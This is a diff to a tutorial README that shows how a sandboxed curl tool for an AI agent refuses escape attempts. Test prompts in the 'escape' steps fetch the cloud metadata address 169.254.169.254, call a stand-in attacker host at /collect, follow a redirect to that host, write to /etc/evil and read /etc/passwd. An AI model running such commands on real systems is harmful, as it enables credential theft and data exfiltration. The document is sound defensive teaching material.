@@ -82,7 +82,7 @@ line basics Rust's standard library needs: stdout, environment, clocks.)
 Prebuilt:
 
 ```sh
-kubectl apply -f steps/02-curl/workload.yaml \
+kubectl apply -f steps/02-curl/workloaddeployment.yaml \
   && sleep 2 && kubectl wait --for=condition=Ready \
   workloaddeployment/toolbox-agent
 ```
@@ -90,12 +90,12 @@ kubectl apply -f steps/02-curl/workload.yaml \
 Your build:
 
 ```sh
-kubectl apply -f steps/02-curl/workload-mine.yaml \
+kubectl apply -f steps/02-curl/workloaddeployment-mine.yaml \
   && sleep 2 && kubectl wait --for=condition=Ready \
   workloaddeployment/toolbox-agent
 ```
 
-`workload-mine.yaml` is `workload.yaml` with one change: the `curl` image is
+`workloaddeployment-mine.yaml` is `workloaddeployment.yaml` with one change: the `curl` image is
 `tool-curl:mine`. Built again? Run `make push-build`, then
 `kubectl delete workloaddeployment toolbox-agent` and apply again, so the host
 fetches the new push.
@@ -106,7 +106,7 @@ in both manifests: one host, one folder.
 ```yaml
 - name: curl
   localResources:
-    allowedHosts: [api.demo-sites.svc]
+    allowedHosts: [api.mock-sites.svc]
     volumeMounts: [{ name: curl-data, mountPath: /data }]
 ```
 
@@ -130,23 +130,39 @@ The messages are the tool's choice. What gets through is the host's.
 Type each prompt into the chat at http://agent.localhost:18180, or run the
 curl command under it.
 
-**1. Fetch the granted host:** `fetch http://api.demo-sites.svc/data`
+**1. Fetch the granted host** 
+
+In the chat:
+
+```
+fetch http://api.mock-sites.svc/data
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'fetch http://api.demo-sites.svc/data'
+  -d 'fetch http://api.mock-sites.svc/data'
 ```
 
 The prompt that got "isn't installed yet" in step 1. The host is in curl's
-`allowedHosts`, so the demo API answers.
+`allowedHosts`, so the mock API answers.
 
-**2. Save a page into the tool's folder:** `save http://api.demo-sites.svc/data to page.html`
+**2. Save a page into the tool's folder** 
+
+In the chat:
+
+```
+save http://api.mock-sites.svc/data to page.html
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'save http://api.demo-sites.svc/data to page.html'
+  -d 'save http://api.mock-sites.svc/data to page.html'
 ```
 
 The model turns this into `curl -o page.html`. The prebuilt curl answers
@@ -156,7 +172,15 @@ so the write succeeds: the folder is the boundary, not a blanket ban.
 
 ## Now try each escape
 
-**3. The metadata service is refused:** `curl -s http://169.254.169.254/latest/meta-data/`
+**3. The metadata service is refused** 
+
+In the chat:
+
+```
+curl -s http://169.254.169.254/latest/meta-data/
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
@@ -166,41 +190,73 @@ curl -s -H 'Host: agent.localhost' \
 
 On most clouds this address hands out credentials. The host refuses it before anything leaves.
 
-**4. An attacker's server is refused:** `curl -s http://attacker.demo-sites.svc/collect`
+**4. An attacker's server is refused** 
+
+In the chat:
+
+```
+curl -s http://attacker.mock-sites.svc/collect
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'curl -s http://attacker.demo-sites.svc/collect'
+  -d 'curl -s http://attacker.mock-sites.svc/collect'
 ```
 
-`attacker.demo-sites.svc` plays the server of someone who has hijacked the
+`attacker.mock-sites.svc` plays the server of someone who has hijacked the
 agent, the address a planted instruction would tell it to send data to. It is
 on the network and would answer, but it isn't in curl's grant, so the host
 refuses the request before it leaves.
 
-**5. A redirect can't sneak past:** `curl -sL http://api.demo-sites.svc/redirect`
+**5. A redirect can't sneak past** 
+
+In the chat:
+
+```
+curl -sL http://api.mock-sites.svc/redirect
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'curl -sL http://api.demo-sites.svc/redirect'
+  -d 'curl -sL http://api.mock-sites.svc/redirect'
 ```
 
 The granted host redirects to the attacker's server. The host checks every hop, including the one you didn't type, and refuses the second.
 
-**6. Writing outside /data fails:** `curl -o /etc/evil -s http://api.demo-sites.svc/data`
+**6. Writing outside /data fails** 
+
+In the chat:
+
+```
+curl -o /etc/evil -s http://api.mock-sites.svc/data
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'curl -o /etc/evil -s http://api.demo-sites.svc/data'
+  -d 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
 ```
 
 This curl sees one folder, so `/etc` doesn't exist for it. The filesystem
 says "No such file or directory"; the tool calls that `access-denied`.
 
-**7. Reading a file:// URL outside /data fails:** `curl -s file:///etc/passwd`
+**7. Reading a file:// URL outside /data fails** 
+
+In the chat:
+
+```
+curl -s file:///etc/passwd
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
@@ -211,7 +267,15 @@ curl -s -H 'Host: agent.localhost' \
 Native curl reads any file your user can. This curl reads `file://` URLs
 through the same one folder, so `/etc/passwd` doesn't exist for it.
 
-**8. Reading a file:// URL inside /data works:** `curl -s file:///data/page.html`
+**8. Reading a file:// URL inside /data works** 
+
+In the chat:
+
+```
+curl -s file:///data/page.html
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
